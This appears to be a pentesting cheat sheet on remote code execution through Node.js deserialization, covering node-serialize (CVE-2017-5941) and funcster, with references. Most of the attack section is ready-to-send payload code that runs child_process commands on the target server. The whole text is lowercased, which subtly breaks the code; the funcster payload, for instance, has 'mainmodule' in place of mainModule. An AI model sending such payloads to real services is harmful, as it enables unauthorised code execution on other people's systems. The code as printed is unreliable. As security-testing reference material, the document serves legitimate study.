# node deserialization

> node.js deserialization refers to the process of reconstructing javascript objects from a serialized format, such as json, bson, or other formats that represent structured data. in node.js applications, serialization and deserialization are commonly used for data storage, caching, and inter-process communication.


## summary

* [methodology](#methodology)
    * [node-serialize](#node-serialize)
    * [funcster](#funcster)
* [references](#references)


## methodology

* in node source code, look for:

    * `node-serialize`
    * `serialize-to-js`
    * `funcster`


### node-serialize

> an issue was discovered in the node-serialize package 0.0.4 for node.js. untrusted data passed into the `unserialize()` function can be exploited to achieve arbitrary code execution by passing a javascript object with an immediately invoked function expression (iife).

1. generate a serialized payload
    ```js
    var y = {
        rce : function(){
            require('child_process').exec('ls /', function(error,
            stdout, stderr) { console.log(stdout) });
        },
    }
    var serialize = require('node-serialize');
    console.log("serialized: \n" + serialize.serialize(y));
    ```
2. add bracket `()` to force the execution
    ```js
    {"rce":"_$$nd_func$$_function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}()"}
    ```
3. send the payload


### funcster

```js
{"rce":{"__js_function":"function(){cmd=\"cmd /c calc\";const process = this.constructor.constructor('return this.process')();process.mainmodule.require('child_process').exec(cmd,function(error,stdout,stderr){console.log(stdout)});}()"}}
```


## references

- [cve-2017-5941 - national vulnerability database - february 9, 2017](https://nvd.nist.gov/vuln/detail/cve-2017-5941)
- [exploiting node.js deserialization bug for remote code execution (cve-2017-5941) - ajin abraham - october 31, 2018](https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf)
- [nodejs deserialization - gonczor - january 8, 2020](https://blacksheephacks.pl/nodejs-deserialization/)